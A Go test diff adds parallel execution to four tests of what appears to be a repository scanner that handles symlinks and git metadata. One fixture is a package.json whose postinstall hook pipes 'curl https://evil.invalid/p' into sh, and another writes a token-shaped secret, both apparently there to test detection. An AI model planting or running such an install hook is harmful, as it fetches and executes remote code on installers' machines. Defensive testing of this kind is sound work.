@@ -9,6 +9,7 @@ import (
 )
 
 func TestDirectorySymlinkScansSameContent(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	writeFixture(t, repo, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
 	link := filepath.Join(t.TempDir(), "repo")
@@ -23,6 +24,7 @@ func TestDirectorySymlinkScansSameContent(t *testing.T) {
 }
 
 func TestGitMetadataCannotReadExternalSymlink(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	private := filepath.Join(t.TempDir(), "private")
 	if err := os.WriteFile(private, []byte("ghp_abcdefghijklmnopqrstuvwxyz1234567890"), 0o600); err != nil {
@@ -41,6 +43,7 @@ func TestGitMetadataCannotReadExternalSymlink(t *testing.T) {
 }
 
 func TestLinkedGitDirectoryIsIncomplete(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	writeFixture(t, repo, "metadata/config", "[core]\n hooksPath = hooks\n")
 	if err := os.Symlink("metadata", filepath.Join(repo, ".git")); err != nil {
@@ -53,6 +56,7 @@ func TestLinkedGitDirectoryIsIncomplete(t *testing.T) {
 }
 
 func TestGitMetadataUsesRepositoryLimits(t *testing.T) {
+	t.Parallel()
 	repo := t.TempDir()
 	writeFixture(t, repo, ".git/config", strings.Repeat("x", 4096))
 	writeFixture(t, repo, ".git/config.worktree", strings.Repeat("x", 4096))
